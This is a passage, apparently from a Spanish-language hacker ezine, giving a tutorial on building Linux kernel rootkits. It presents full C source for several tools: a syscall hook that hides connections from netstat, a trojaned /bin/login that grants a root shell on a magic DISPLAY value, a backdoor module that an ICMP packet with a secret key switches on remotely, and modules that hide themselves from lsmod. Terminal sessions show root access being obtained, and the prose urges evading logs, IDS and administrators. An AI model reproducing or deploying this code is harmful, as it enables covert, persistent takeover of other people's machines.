+      }
+      del_addr(local, remote);
+      kfree(local);
+      kfree(remote);
+    }
+  }
+  return;
+}
+
+#define LKM_DEVICE "/dev/iomolo"
+
+int _dev_create(void) {
+  int ret;
+  long tmp;
+  if ((mn=register_chrdev(mn, "fog2", &fops))<0) return(-1);
+  tmp=current->addr_limit.seg;
+  current->addr_limit.seg=0xFFFFFFFF;
+  ret=mknod(LKM_DEVICE, S_IFCHR|0600, makedev(mn,0));
+  current->addr_limit.seg=tmp;
+  return(ret);
+}
+
+void _dev_delete(void) {
+  long tmp;
+  tmp=current->addr_limit.seg;
+  current->addr_limit.seg=0xFFFFFFFF;
+  unlink(LKM_DEVICE);
+  current->addr_limit.seg=tmp;
+  unregister_chrdev(mn, "fog2");
+}
+
+int init_module() {
+  _dev_create();
+  o_read=sys_call_table[__NR_read];
+  sys_call_table[__NR_read]=my_read;
+  return(0);
+}
+
+void cleanup_module() {
+  _dev_delete();
+  sys_call_table[__NR_read]=o_read;
+}
+
+---/ fucknetstat.c /---
+
+     Vamos a comprobar que el modulo funcione correctamente :)))
+
+
+    barracuda ~# netstat -na
+    tcp        0      0 62.37.174.49:53         0.0.0.0:*               LISTEN
+    tcp        0      0 62.37.174.49:1029       212.59.199.131:6667     ESTABLISHED
+    tcp        0      0 62.37.174.49:1026       217.126.33.148:6667     ESTABLISHED
+    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN
+    tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN
+    tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN
+    tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN
+    tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN
+    udp        0      0 62.37.174.49:53         0.0.0.0:*
+    udp        0      0 192.168.1.1:53          0.0.0.0:*
+    udp        0      0 127.0.0.1:53            0.0.0.0:*
+    raw        0      0 0.0.0.0:1               0.0.0.0:*               7
+    raw        0      0 0.0.0.0:6               0.0.0.0:*               7
+    Active UNIX domain sockets (servers and established)
+    Proto RefCnt Flags       Type       State         I-Node Path   
+    unix  0      [ ACC ]     STREAM     LISTENING     98     /dev/gpmctl
+    unix  0      [ ACC ]     STREAM     LISTENING     798    /tmp/xmms_root.0
+    (... etc etc ...)
+    barracuda ~# echo add addr 62.37.174.49:1029 212.59.199.131:6667 > /dev/iomolo
+    barracuda ~# netstat -na
+    tcp        0      0 62.37.174.49:53         0.0.0.0:*               LISTEN
+    tcp        0      0 62.37.174.49:1026       217.126.33.148:6667     ESTABLISHED
+    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN
+    tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN
+    tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN
+    tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN
+    tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN
+    udp        0      0 62.37.174.49:53         0.0.0.0:*
+    udp        0      0 192.168.1.1:53          0.0.0.0:*
+    udp        0      0 127.0.0.1:53            0.0.0.0:*
+    raw        0      0 0.0.0.0:1               0.0.0.0:*               7
+    raw        0      0 0.0.0.0:6               0.0.0.0:*               7
+    Active UNIX domain sockets (servers and established)
+    Proto RefCnt Flags       Type       State         I-Node Path
+    unix  0      [ ACC ]     STREAM     LISTENING     98     /dev/gpmctl
+    unix  0      [ ACC ]     STREAM     LISTENING     798    /tmp/xmms_root.0
+    (... etc etc ...)
+
+    
+     Funciona!!!! Se oculto bien la conexion... :)))
+
+    
+
+
+    5.8. Abriendo una backdoor remota
+    ---------------------------------
+     
+     Obiamente, cuando accedemos a una maquina lo que queremos es
+ingeniarnoslas para conseguir accedes a dicha maquina siempre que queramos
+de forma facil. ¿Que mejor manera que troyanizar el kernel para conseguir un
+acceso remoto?
+
+
+
+        5.8.1. Redireccionando /bin/login
+	---------------------------------
+
+     Muchos de vosotros conocereis la existencia del troyano remoto para
+/bin/login que usa el valor de la variable de entorno DISPLAY (la cual es
+negociada en la sesion telnet) para saber debe ejecutar el login normal o un
+shell. Obiamente si troyanizamos una maquina de esta manera estaremos en
+manos del administrador si este es un poco listo y usa alguna herramienta
+del estilo tripwire. Para evadir triwire nos colocaremos una vez mas encima
+de el, en el kernel.
+
+     Seria muy facil, decirle al kernel que redireccione todas las
+ejecuciones de /bin/login a /tmp/hacktools/tlogin pero veamos las fuentes
+de tlogin.
+
+---/ tlogin.c /---
+
+#include <stdio.h>
+
+#define OLDLOGIN "/usr/lib/.login"
+#define LOGINNAME "login"
+#define MAGIC_WORD "ImHax0r"
+
+#define MSG "Eres un autentico hax0r";
+
+char **exe;
+
+do_back() {
+  puts(MSG);
+  putenv("TERM=vt100");
+  execl("/bin/sh","sh","-i",0);
+}
+
+main(argc, argv)
+  int argc;
+  char *argv[];
+{
+  exe=argv;
+  exe[0]=LOGINNAME;
+  if ((char *)getenv("DISPLAY") != (char *)NULL)
+    if (strncmp(getenv("DISPLAY"),MAGIC_WORD,strlen(MAGIC_WORD))==0)
+      do_back();
+  execv(OLDLOGIN,exe);
+}
+
+---/ tlogin.c /---
+
+    De entrada vemos #define OLDLOGIN "/usr/lib/.login", y vemos que si 
+do_hack() no se ejecuta lo hara execv(OLDLOGIN,exe). Si usasemos este tlogin
+de forma normal no habria problemas (no voy a decir como usarlo porque no el
+el objetivo del doc, ademas creo que si estais aqui es porque algo sabeis
+¿no? asi que leereos tlogin.c y tratad de averiguar como funciona :), pero
+nosotros usaremos el kernel para redireccionar /bin/login a
+/tmp/hacktools/tlogin, por lo que el autentico login no esta en
+/usr/lib/.login sino en /bin/login mismo. Pensareis... Bien facil... basta
+con poner #define OLDLOGIN "/bin/login" pero si pensais un poco eso nos 
+meteria en un bucle infinito de execve's sin lograr nosotros nuestro
+objetivo, pues al tratar de llamar al login normal volvera a llamar al login
+troyanizado debido al redireccionamiento. Hay varias soluciones para esto
+(copiar el login real en /usr/lib/.login, hacer que tlogin no llame a execve
+sino a la copia original de la syscall....) pero yo voy a contar la que a mi
+parecer es la mas limpia.
+
+     Usaremos una variable en nuestro modulo para indicar si debe realizarse
+el redireccionamiento o no. Pero claro, nosotros colocaremos esa variable
+por defecto a 0 (no redireccionar), por lo que debemos de lograr colocarla a
+1 de forma remota. Para ello insertaremos una rutina en el stack tcp/ip del
+kernel que lea todos los ICMP_ECHOREPLY y compruebe que en el campo de
+datos haya una contraseña de 64 bits que nosotros habremos elegido
+previamente. No hay que olvidar que debemos colocar la variable a 0 de nuevo
+antes de que tlogin entre en accion, pues sino volveriamos a estar en el
+bucle sin fin. Bien... antes que nada en tlogin debemos poner #define 
+OLDLOGIN "/bin/login" :) Ahora veamos el modulo. 
+
+---/ backdoor_1.c /---
+
+/*
+ * TILE: Remote Backdoor (/bin/login redirect) <1/8/2001>
+ *
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ *
+ * DESCR: This is a stupid LKM using execve redirect to use a /bin/login 
+ *        trojan evading MD5 checksums to binary files. This LKM can be
+ *        activated remotely sending to ataked host an ICMP_ECHOREPLY
+ *        packet with an signature. To send this packet you can use
+ *        rbackdoor_1.c.
+ *
+ * RECOM: Always the same... hide the module and practice sex everyday. 
+ *
+ * TESTED: This LKM have been tested without problems on:
+ *           - Linux kernel 2.2.18pre10 (Debian 2.2)
+ *           - Linux kernel 2.2.19 (Debian 2.2)
+ *
+ */
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/ip.h>
+#include <linux/icmp.h>
+
+#include <linux/mm.h>
+#include <linux/skbuff.h>
+#include <linux/netdevice.h>
+
+#include <sys/syscall.h>
+
+#define _7A69SOFT_
+#define CODER       "Ripe"
+#define DEBUGMODE
+
+#define TLOGIN "/tmp/tlogin" /*
+                              * Aqui es donde deberia estar la version de
+                              * login troyanizada.
+                              */
+
+#define MAGIC_KEY 0x00007469 /*
+                              * Esta es la pass de 64 bits que usaremos
+                              * para identificar las peticiones de
+                              * activacion del redireccionamiento remotamente
+                              * via ICMP_ECHO_REPLY
+                              */
+#define ICMP_ECHOREPLY 0
+
+/*
+ * La entrada en la sys_call_table en la que copiaremos el puntero a la
+ * syscall execve original, para poder llamarla desde mexecve().
+ */
+#define __NR_mexecve  222
+
+extern void *sys_call_table[];
+
+int (*o_execve)(const char *filename, char *const argv [], char *const envp[]);
+int (*o_brk)(void *end_data_segment);
+void *tmp;
+
+/*
+ * Variable que indicara si debemos realizar el redireccionamiento de
+ * execve o no.
+ */
+int redir_on=0;
+
+/*
+ * Esta es la funcion a la que llamaremos cuando queramos que se ejecute
+ * execve original.
+ */
+
+struct packet_type my_pkt;
+
+int mexecve(const char *filename, char **argv, char **envp)
+{
+  long __res;
+  __asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_mexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp)));
+  return (int) __res;
+}
+
+/*
+ * Nuestra version troyanizada de la syscall... que malos somos :)
+ */
+int my_execve(const char *filename, char *const argv [], char *const envp []) {
+  char *exec;
+  int ret;
+  unsigned long tmp;
+  /*
+   * Si no debemos redireccionar pues no lo hacemos (que obedientes somos :)
+   */
+  if (!redir_on) return(mexecve(filename, (char **)argv, (char **)envp));
+  /*
+   * Si se ejecuta lo siguiente es que debemos redireccionar /bin/login...
+   * Vamos alla!
+   */
+  exec=(char *)kmalloc(strlen(filename)+1, GFP_KERNEL);
+  memset(exec, 0, strlen(filename)+1);
+  __generic_copy_from_user(exec, filename, strlen(filename));
+  /*
+   * Falsa alarma! no es /bin/login... actuemos con normalidad.
+   */
+  if (strcmp(filename, "/bin/login")) {
+    kfree(exec);  /* mejor liberamos la memoria O:-) */
+    return(mexecve(filename, (char **)argv, (char **)envp));
+  }
+  /*
+   * Definitivamente.... si estamos aqui es que debemos currarnos el
+   * redireccionamiento (si no entendeis esta parte leed la explicacion
+   * del redireccionamiento de ejecuciones).
+   */
+  kfree(exec);
+  tmp=current->mm->brk;
+  (*o_brk)((void *)current->mm->brk+strlen(TLOGIN)+1);
+  __generic_copy_to_user(tmp, TLOGIN);
+  redir_on=0; /* Con esto evitamos el bucle infinito.... :P */
+  printk("excute=%s\n", tmp);
+  ret=mexecve((char *)tmp, (char **)argv, (char **)envp);
+  (*o_brk)((void *)tmp);
+  return(ret);
+}
+
+/*
+ * Esta es la rutina que usaremos para leer los ICMPs :)
+ */
+int sniffer(struct sk_buff *skb, struct device *dev, struct packet_type *pkt) {
+  int len;
+  unsigned long *key;
+  if (skb->pkt_type!=PACKET_HOST) {
+    kfree_skb(skb);
+    return(0);    /* Oppps! esto no es mio */
+  }
+  if (skb->nh.iph->protocol!=1) {
+    kfree_skb(skb);
+    return(0);    /* No me intresa, esta mierda no es un ICMP */
+  }
+  /*
+   * Lo colocamos todo bien :)
+   */
+  skb->h.raw = skb->nh.raw + skb->nh.iph->ihl*4;
+  skb->data=skb->nh.raw+(skb->nh.iph->ihl*4)+sizeof(struct icmphdr);
+  len=htons(skb->nh.iph->tot_len)-(skb->nh.iph->ihl*4)-28;
+  if (skb->h.icmph->type!=ICMP_ECHOREPLY) {
+    kfree_skb(skb);
+    return(0);    /* Pos este si es ICMP, pero no me intersa */
+  }
+  /*
+   * Ahora miramos que en el campo datos este la MAGIC_KEY. Si esta activaremos
+   * el redireccionamiento.
+   */
+  key=(unsigned long *)skb->data;
+  if (*key==MAGIC_KEY) {
+    redir_on=1; /* Ale! ya podeis pasar */
+#ifdef DEBUGMODE
+    printk("(RB) Redireccion activa!\n");
+#endif
+  }
+  kfree_skb(skb);
+  return(0);
+}
+
+int init_module() {
+  /*
+   * hockeamos las syscalls necesarias.
+   */
+  o_brk=sys_call_table[__NR_brk];
+  o_execve=sys_call_table[__NR_execve];
+  tmp=sys_call_table[__NR_mexecve];
+  sys_call_table[__NR_mexecve]=o_execve;
+  sys_call_table[__NR_execve]=my_execve;
+  sys_call_table[__NR_mexecve]=o_execve;
+  /*
+   * Implantamos nuestra rutina en el stack TCP/IP.
+   */
+  my_pkt.type=htons(ETH_P_ALL);
+  my_pkt.func=sniffer;
+  dev_add_pack(&my_pkt);
+#ifdef DEBUGMODE
+  printk("(RB) Remote backdoor (redir /bin/login) by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(RB) Loaded!\n");
+#endif
+  return(0); /* na fue mal */
+}
+
+void cleanup_module() {
+  /*
+   * Lo dejamos todo como estaba antes de tocar nada :P
+   */
+  sys_call_table[__NR_execve]=o_execve;
+  sys_call_table[__NR_mexecve]=tmp;
+  dev_remove_pack(&my_pkt);
+#ifdef DEBUGMODE
+  printk("(RB) Remote backdoor (redir /bin/login) by Ripe - <ripe@7a69ezine.or>\n");
+  printk("(RB) UnLoaded!\n");
+#endif
+}
+
+---/ backdoor_1.c /---
+
+     Mirar si os lo pongo facilito que ademas os programo esto para poder
+mandar los ICMPs. Este codigo no esta comentado porque no tiene nada que ver
+con los LKMs, si quieres aprender sobre sockets e ICMP te remito al documento 
+escrito por Doing publicado en 7a69#8, y al articulo sobre este protocolo
+escrito por mi publicado en 7a69#11. 
+
+---/ rbackdoor.c */
+
+/*
+ * TILE: Remote Backdoor (/bin/login redirect) The access!!! <1/8/2001>
+ *
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ *
+ * DESCR: I've no idea.... and you?
+ *
+ * RECOM: hug?
+ *
+ */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+#include <linux/if.h>
+#include <sys/ioctl.h>
+#include <netdb.h>
+#include <strings.h>
+#include <stdio.h>
+
+#define MAGIC_KEY 0x00007469
+
+char *get_dev_from_ip(u_int32_t dst_ip)
+{
+  FILE *f;
+  char device[256];
+  u_int32_t dest;
+  char gtw[256];
+  int flags;
+  int refcnt;
+  int use;
+  int metric;
+  int mtu, window, irtt;
+  u_int32_t mask;
+  char ch;
+  char *default_dev = NULL;
+  f = fopen("/proc/net/route", "r");
+  if (!f) {
+    perror("open");
+    exit(0);
+  }
+  while (!feof(f)) {
+    for (;;) {
+      fread(&ch, 1, 1, f);
+      if (ch == '\n') break;
+      if (feof(f)) {
+        printf("Error: /proc/net/route has 0 lenght!\n");
+        exit(0);
+      }
+    }
+    fscanf(f, "%s\t%x\t%s\t%x\t%i\t%i\t%i\t%x\t%x\t%x\t%x",
+           device, &dest, gtw, &flags, &refcnt, &use, &metric, &mask, &mtu, &window, &irtt);
+    if (!(flags & 0x1)) continue;
+    if ((dst_ip & mask) == (dest & mask)) {
+      fclose(f);
+      if (default_dev) free(default_dev);
+      default_dev = (char*) malloc(strlen(device) + 1);
+      strncpy(default_dev, device, strlen(device) + 1);
+      return default_dev;
+    }
+    if (!dest) {
+      default_dev = (char*) malloc(strlen(device) + 1);
+      strncpy(default_dev, device, strlen(device) + 1);
+    }
+  }
+  fclose(f);
+  if (default_dev) return default_dev;
+  exit(0);
+}
+
+
+u_int32_t get_ip_from_dev(char *dev)
+{
+  struct ifreq ifr;
+  int fd = socket(AF_INET, SOCK_DGRAM, 0);
+  struct sockaddr_in ret;
+
+  strncpy(ifr.ifr_name, dev, sizeof(ifr.ifr_name));
+
+  ioctl(fd, SIOCGIFFLAGS, &ifr);
+  if ((ifr.ifr_flags & IFF_UP) == IFF_UP) {
+    ioctl(fd, SIOCGIFADDR, &ifr);
+    memcpy(&ret, &ifr.ifr_addr, sizeof(struct sockaddr_in));
+    return ret.sin_addr.s_addr;
+  }
+  exit(0);
+}
+
+int main(int argc, char **argv) {
+  char pqt[4096];
+  struct sockaddr_in sa;
+  struct hostent *he;
+  struct iphdr *ip=(struct iphr *)pqt;
+  struct icmphdr *icmp=(struct icmphdr *)(pqt+sizeof(struct iphdr));
+  unsigned long *key=(unsigned long *)(pqt+sizeof(struct iphdr)+sizeof(struct icmphdr));
+  char *host;
+  char *dev;
+  int s, n;
+  long sum;
+  unsigned short *p;
+  unsigned short impar;
+  host=NULL;
+  memset(pqt, 0, 4096);
+  if (!inet_aton(argv[1], &sa.sin_addr)) {
+    if ((he=gethostbyname(argv[1]))==NULL) {
+      fprintf(stderr, "Host incorrecyo\n");
+      exit(1);
+    }
+    bcopy(he->h_addr, &sa.sin_addr, he->h_length);
+    host=he->h_name;
+  }
+  sa.sin_family=AF_INET;
+  sa.sin_port=0;
+  if ((s=socket(AF_INET, SOCK_RAW, 255))<0) {
+    perror("socket");
+    exit(1);
+  }
+  if (!(dev=get_dev_from_ip(sa.sin_addr.s_addr))) {
+    perror("get_dev_from_ip");
+    exit(1);
+  }
+  icmp=(struct icmphdr *)pqt;
+  icmp->type=ICMP_ECHOREPLY;
+  icmp->code=0;
+  icmp->checksum=0;
+  icmp->un.echo.id=getpid();
+  icmp->un.echo.sequence=0;
+  p=(unsigned short *)pqt;
+  sum=0;
+  n=sizeof(struct icmphdr);
+  while(n>1) {
+    sum+=*p++;
+    n-=2;
+  }
+  if (n==1) {
+    impar=0;
+    *((unsigned char *)&impar)=*(unsigned char *)p;
+    sum+=impar;
+  }
+  sum=(sum>>16)+(sum&0xffff);
+  sum+=(sum>>16);
+  icmp->checksum=(unsigned short)~sum;
+  ip->ihl=5;
+  ip->version=4;
+  ip->tot_len=htons(sizeof(struct iphdr)+sizeof(struct icmphdr)+4);
+  ip->protocol=1;
+  ip->ttl=0xff;
+  ip->id=rand()%0xffff;
+  ip->saddr=get_ip_from_dev(dev);
+  ip->daddr=sa.sin_addr.s_addr;
+  printf("key=%x\n", *key);
+  *key=(unsigned long)MAGIC_KEY;
+  printf("key=%x\n", *key);
+  if (sendto(s, pqt, sizeof(struct iphdr)+sizeof(struct icmphdr)+4, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+    perror("sendto");
+    exit(1);
+  }
+}
+
+---/ rbackdoor_1.c /---
+
+    Bien, como es de suponer esta backdoor remota es una chapuza y es
+inifinitamente mejorable, y como siempre os voy a decir como mejorarlo...
+DoItYorSelf, recordais?
+
+    Antes que nada, el ICMP mandado por rbackdoor_1 lleva nuestra IP, y un IDS
+(Intrusion Detection System) podria extrañarse y hacer saltar la alarma si
+se recive un ICMP_ECHOREPLY no solicitado. La solucion mas facil seria
+mandar el ICMP spoofeado, la alarma seguiria saltando pero nuestra IP no
+seria sospechosa de nada :)
+
+    Ahora usemos la backdoor, a ver que mas cosas vemos...
+    
+
+    barracuda ~# gcc tlogin.c -o /tmp/tlogin
+    barracuda ~# gcc -O3 -c -I/usr/src/linux/include backdoor_1.c
+    barracuda ~# insmod backdoor_1.o
+    barracuda ~# gcc rbackdoor_1.c -o rbackdoor
+    barracuda ~# ./rbackdoor localhost
+    barracuda ~# export DISPLAY="ImHax0r"
+    barracuda ~# telnet localhost
+    Trying 127.0.0.1...
+    Connected to localhost.
+    Escape character is '^]'.
+    Debian GNU/Linux 2.2 barracuda
+    Eres un autentico hax0r
+    sh-2.03# id
+    uid=0(root) gid=101(telnetd) groups=101(telnetd),43(utmp)
+    sh-2.03# netstat -na
+    Active Internet connections (servers and established)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State
+     tcp        0      0 127.0.0.1:23            127.0.0.1:1178          ESTABLISHED
+    (... etc etc ...)
+    sh-2.03# exit
+    barracuda ~# tail -n1 /var/log/messages
+    Aug  1 21:12:56 localhost in.telnetd[458]: connect from 127.0.0.1
+    barracuda ~#    
+
+
+    Oh! no! Mientras estamos en sesion pueden vernos con un simple netstat, y
+ademas dejamos un mensajito desagradable en /var/log/messages. Como podemos
+evadir esto? Empezaremos por evadir el tema del mensajito, esto tiene facil
+solucion, basta con implementar algo parecido a evade_log.c y hacer un 
+add_log(ip) y add_log(host), pero como sabra la IP el modulo? (recordad que
+hemos decidido que mandariamos el ICMP_ECHOREPLY spoofeado) Pues facil, 
+pondremos en el campo de datos, justo despues de la firma nuestra IP. De la 
+misma manera ocultaremos todas las conexiones realizada a/desde nuestra maquina
+al host atacado, trabajando igual que hace fucknetstat.c.
+
+    Se han acabado los problemas? Ni mucho menos. Seria tambien conveniente
+ocultar el fichero /tmp/tlogin, para ello implementaremos algo parecido a
+rhidef.c. Tambien vemos que tenemos dos proceos en la maquina abiertos por
+nosotros que podrian delatarnos un in.telnetd y un bash. Si pensais un poco
+lograreis tambien ocultar estos procesos, la dificultad aqui recae en saber
+los PIDs desde el propio modulo :)
+
+    Bueno, como veis este modulo es infinitamente mejorable, pero claro, eso
+es trabajo vuestro. Mi intencion es solo la de dar ejemplos sencillos para que
+luego vostros seais capaces de codear el rootkit perfecto para el kernel de
+linux... sereis capaces?
+
+
+
+
+    5.9. Ocultando el propio modulo
+    --------------------------------
+
+     Obviamente de nada sirve que un modulo haga maravillas si el
+administrador del sistema puede verlo haciendo un simple "lsmod". Por ello
+debemos procurar que nuestro modulo sea invisible en el sistema. Para poder
+hacer esto debemos saber como se gestionan los LKMs en un sistema como
+linux. Ello lo podeis ver en el fichero kernel/module.c (fichero al que
+recomiendo echar un ojo, pues es una de las funcionalidades del kernel que a
+mi me ha sido mas facil de entender). 
+
+     Los modulos se guardan en el kernel en una lista enlazada apilada, en
+la que la una struct module (kernel_module) forma la base de dicha pila y
+un puntero struct module (module_list) apunta a la cima. Si bien
+kernel_module no cambia de valor, module_list si que lo hace, cada vez que
+se llama a sys_create_module (la syscall usada para insertar un nuevo modulo
+en la lista). Para poder eliminar un modulo de la lista deberiamos tener
+acceso a module_list, ya que desde ahi podriamos recorrer la lista enlazada
+hasta llegar a kernel_module (la base de la lista) donde el puntero next
+valdria NULL. Bien, si tenemos en cuenta, que cuando se llama a
+sys_create_module nuestro modulo pasara a ser la cima de la lista (consultad
+las fuentes :), podemos tener acceso al valor de module_list en ese
+instante, pues lo tendriamos en &__this_module (que es el puntero que apunta a
+la struct module de nuestro propio modulo). Esto quiere decir que en el
+momento en el que insertamos un modulo podemos eliminar si dificultad alguna
+cualquier modulo que se encontrara cargado recorriendo simplemente la lista
+y reapuntando unos punteros. Veamos como seria con un ejemplo simplon.
+
+---/ hide_module1.c /---
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/mm.h>
+
+#define NULL (void *)0
+
+/*
+ * Leeremos el nombre del modulo a ocultar por parametro.
+ */
+char *mod;
+MODULE_PARM(mod, "s");
+
+/*
+ * Funcion que usaremos para ver si el modulo existe en la lista.
+ */
+struct module *find_module(char *name) {
+  struct module *m;
+  for(m=&__this_module ; m ; m=m->next) {
+    if (m->flags & MOD_DELETED) continue;
+    if (!strcmp(name, m->name)) break;
+  }
+  return(m);
+}
+
+int init_module() {
+  struct module *m;
+  struct module *m2;
+  if (!mod) goto out;
+  if (!find_module(mod)) goto out;
+  for(m=&__this_module, m2=NULL ; m ; m2=m, m=m->next)
+    if (!strcmp(m->name, mod)) break;
+  /*
+   * Aqui esta el hack :)
+   */
+  m2->next=m->next;
+out:
+  return(-1);
+}
+				  
+void cleanup_module() {
+}
+				  
+---/ hide_module1.c /---
+
+     Vemos ahora un sencillo ejemplo de su funcionamiento :)
+
+
+    barracuda ~# lsmod
+    es1371                 26544   0
+    soundcore               2440   4  [es1371]
+    rtl8139                11144   1
+    nfsd                  160536   0  (unused)
+    nfs                    43820   0  (unused)
+    barracuda ~# insmod hide_module1.o mod=nfsd
+    hide_module1.o: init_module: Device or resource busy
+    Hint: this error can be caused by incorrect module parameters, including invalid IO or IRQ parameters
+    barracuda ~# lsmod
+    es1371                 26544   0
+    soundcore               2440   4  [es1371]
+    rtl8139                11144   1
+    nfs                    43820   0  (unused)      
+    barracuda ~#
+
+
+     Bien, con este modulo podremos eliminar cualquier modulo que haya sido
+cargado previamente, pero es muy posible que nos intrese ocultar el propio
+modulo. Teniendo en cuenta que es imposible sacarnos a nosotros mismos de la
+lista puede parecer imposible ocultarnos, pero esto no es asi, pues podemos
+eliminar el ultimo modulo cargado (antes de nosotros) y atrivuir al nuestro
+las propiedades del anterior (nos bastara con atrivuirnos solo las
+propiedades que son visibles al hacer un "lsmod". Veamos un sencillo ejemplo.
+
+---/ hide_module2.c /---
+
+#include __KERNEL__
+#include MODULE
+
+#include <linux/kernel.h>
+#include <linux/modulde.h>
+#include <linux/version.h>
+
+int init_module() {
+  struct module *m=&__this_module; /* El modulo actual :) */
+  struct module *m_next;
+  m_next=m->next;
+  /*
+   * Ahora adoptamos la apariecia del anterior :)
+   */
+  m->name=m_next->name;
+  m->flags=m_next->flags;
+  m->next=m_next->next;
+  return(0);
+}
+
+void cleanup_module() {
+}
+
+---/ hide_module2.c /---
+
+     Como podeis ver el modulo se auto oculta a si mismo (realmente estamos
+ocultando el anterior y adoptando su apariencia).
+
+
+    barracuda ~# lsmod
+    es1371                 26544   0
+    soundcore               2440   4  [es1371]
+    rtl8139                11144   1
+    nfsd                  160536   0  (unused)
+    nfs                    43820   0  (unused)
+    barracuda ~# insmod hide_module2.o
+    barracuda ~# lsmod
+    es1371                 26544   0
+    soundcore               2440   4  [es1371]
+    rtl8139                11144   1
+    nfsd                  160536   0  (unused)
+    nfs                    43820   0  (unused)
+    barracuda ~#
+
+
+     Todo esto esta muy bien, pero lo que seria realmente ideal es que
+pudieramos dejar un modulo cargado en memoria y que con el pudieramos elejir
+que modulo eliminar (haya sido cargado antes o despues que el nuestro). Ello
+parece imposible, pues el symbolo del kernel module_list no ha sido
+exportado, pero si miramos kernel/module.c (nuevamente) veremos que entre el
+symbolo kernel_module y module_list hay un offset conocido, lo que quiere
+decir que si logramos acceder al symbolo kernel_module podremos acceder
+tambien a module_list. Seguro que muchos de vosotros ya habeis visto la luz
+y sabreis como sacar module_list, pero para los demas lo voy a explicar :)
+Solo tendremos que desde &__this_module seguir el puntero next hasta que
+este valga NULL, lo que querra decir que estamos en kernel_module, y una vez
+ahi le sumamos el offset en cuestion y listos, ya tenemos acceso permanente
+a la cima de la pila. Sencillo.
+
+---/ hide_module3.c /---
+
+/*
+ * TILE: Hide_Module3
+ *
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ *
+ * DESCR: This is an simple example how to hide kernel modules in linux, this
+ *        techbique works 100% in linux 2.2 and 2.4 :)
+ *
+ * RECOM: Hide fisrt this module... eheheh.
+ *
+ * TESTED: This LKM have been tested without problems on:
+ *           - Linux 2.2.16 (RedHat 7.1)
+ *           - Linux 2.2.19 (Debian 2.2)
+ *           - Linux 2.4.2 (Debian 2.2)
+ */
+ 
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/mm.h>
+
+#include <sys/syscall.h>
+
+#define _7A69SOFT_
+#define CODER       "Ripe"
+#define DEBUGMODE
+
+#define DEF_HIDE    "hide_lkm"
+
+extern void *sys_call_table[];
+
+char *hide;
+
+struct {
+  char *hide;
+} status;
+  
+int (*o_rename)(const char *oldpath, const char *newpath);
+  
+void *module_list=NULL;
+  
+/*
+ * Esta funcion nos colocara en module_list el simbolo del kernel, para ello
+ * hace lo que he comentado en el documento, fijaos :)
+ */
+void *get_module_list() {
+  struct module *m=THIS_MODULE;
+  while(m->next) m=m->next;
+  module_list=m+1;
+}
+	   
+/*
+ * Funcion que recorre la lista de modulos (desde module_list) buscando
+ * uno con un nombre concreto.
+ */
+struct module *find_module(char *name) {
+  void **tmp;
+  struct module *m;
+  tmp=(void **)module_list;
+  for(m=(*tmp) ; m ; m=m->next) {
+    if (m->flags & MOD_DELETED) continue;
+    if (!strcmp(name, m->name)) break;
+  }
+  return(m);
+}
+
+/*		       
+ * Esta es la funcion que se encargara de sacar el modulo de la lista
+ * enlazada.
+ */
+void hide_lkm(char *lkm) {
+  void **tmp;
+  struct module *m;
+  struct module *m2;
+  if (!find_module(lkm)) return; /* Si no existe el modulo no podemos
+	                          * ocultarlo, asi que retornamos sin hacer
+                                  * nada.
+	                          */
+#ifdef DEBUGMODE
+  printk("(HM) Adding %s lkm to hide list\n", lkm);
+#endif
+  tmp=(void **)module_list;
+  /*
+   * Recorremos la lista hasta encontrar el modulo a ocultar.
+   */
+  for(m=(*tmp), m2=NULL ; m ; m2=m, m=m->next)
+    if (!strcmp(m->name, lkm)) break;
+  /*
+   * Una vez aqui, tenemos en m el modulo a ocultar y en m2 el modulo
+   * anterior (si es que existe).
+   */
+  if (m2) m2->next=m->next; /* Si existe el modulo anterior reapuntamos
+                             * estos punteros para saltarnos el modulo
+			     * a ocultar.
+                             */
+  else (*tmp)=m->next; /* Si no existe es que nuestro modulo es el que esta
+                        * en la cima de la lista (en module_list), por lo que
+			* hacemos que sea el siguiente el que este en la
+                        * cima :)
+			*/
+}
+						
+/*
+ * Mismo rollo de siempre.
+ */
+ int my_rename(const char *oldpath, const char *newpath) {
+   if (!strcmp(newpath, status.hide)) {
+     hide_lkm((char *)oldpath);
+     return(0);
+   }
+   return((*o_rename)(oldpath, newpath));
+}
+		
+/*
+ * Carga/Descarga ¿no?
+ */
+int init_module() {
+  status.hide=(char *)kmalloc(strlen(DEF_HIDE), GFP_KERNEL);
+  strcpy(status.hide, DEF_HIDE);
+  if (hide) {
+    kfree(status.hide);
+    status.hide=hide;
+  }
+  get_module_list(); /* No nos olvidemos de extraer el symbolo :P */
+  o_rename=sys_call_table[__NR_rename];
+  sys_call_table[__NR_rename]=my_rename;
+#ifdef DEBUGMODE
+  printk("(HM) Hide_Module3 by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(HM) Loaded!\n");
+#endif
+  return(0);
+}
+	  
+void cleanup_module() {
+  sys_call_table[__NR_rename]=o_rename;
+#ifdef DEBUGMODE
